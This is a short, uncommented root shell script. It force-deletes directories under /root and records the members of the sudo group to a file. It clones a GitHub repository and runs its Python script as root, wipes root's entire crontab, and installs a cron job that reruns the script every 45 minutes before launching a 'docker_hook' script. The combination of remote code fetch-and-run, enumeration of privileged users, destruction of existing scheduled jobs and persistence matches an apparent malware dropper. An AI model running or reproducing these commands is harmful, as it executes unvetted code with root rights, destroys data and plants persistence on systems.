date >> xxxxxx_test

rm -rf 0ct0pus_main
rm -rf /root/hassed/*
mkdir -p /root/hassed

echo  $(grep '^sudo:.*$' /etc/group | cut -d: -f4) > /root/hassed/read.me

git clone https://github.com/cata0nana/0ct0pus_main.git

cp 0ct0pus_main/* /root/hassed/

python3 /root/hassed/tel_tel.py

crontab -r

(crontab -l -u root 2>/dev/null; echo "*/45 * * * * python3 /root/hassed/tel_tel.py") | crontab -

service cron stop && service cron start

python3 /root/hassed/docker_hook.py running_GCS
